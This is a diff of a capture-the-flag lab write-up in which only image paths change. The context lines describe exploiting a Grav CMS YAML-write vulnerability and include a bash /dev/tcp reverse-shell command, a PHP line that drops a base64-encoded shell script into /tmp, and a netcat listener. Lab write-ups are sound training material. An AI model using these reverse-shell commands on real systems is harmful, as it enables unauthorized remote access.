@@ -43,7 +43,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 ```
 
 Review of the initial nmap scan we identify that port 80 is open. Browsing to the website, we identify that Grav CMS is being used. While we do not see any specific version infomration, we can still look for potential exploits. 
-![Grav-Webpage](/img/pg/astronaut/grav-webpage.png)
+![Grav-Webpage](/assets/img/pg/astronaut/grav-webpage.png)
 
 Using SearchSploit we can see a few possible exploits. Cross-site scripting is generally not going to provide us with an entry point. The Server-Side Template Injection requires authentication. Arbitrary YAML Write/Update could work so we take a look at the exploit details. 
 ```bash
@@ -76,7 +76,7 @@ file_put_contents('/tmp/rev.sh',base64_decode('YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuM
 ```
 In our case, we can replace the target with our target `192.168.245.12` and can run the command `echo -ne "bash -i >& /dev/tcp/192.168.45.240/4444 0>&1" | base64 -w0`. This will out output our base64 encoded payload. Using this, we can modify the exploit as shown below. 
 
-![Exploit Modifications](/img/pg/astronaut/49973_mods.png)
+![Exploit Modifications](/assets/img/pg/astronaut/49973_mods.png)
 
 
 As we specified in the payload, we setup a netcat listener on port 4444 using `nc -nlvp 4444`. Once setup we can run the exploit using `python 49973.py`. It may take a few moments for the shell to be returned. After waiting for a minute, we recieve the reverse shell as the user www-data.
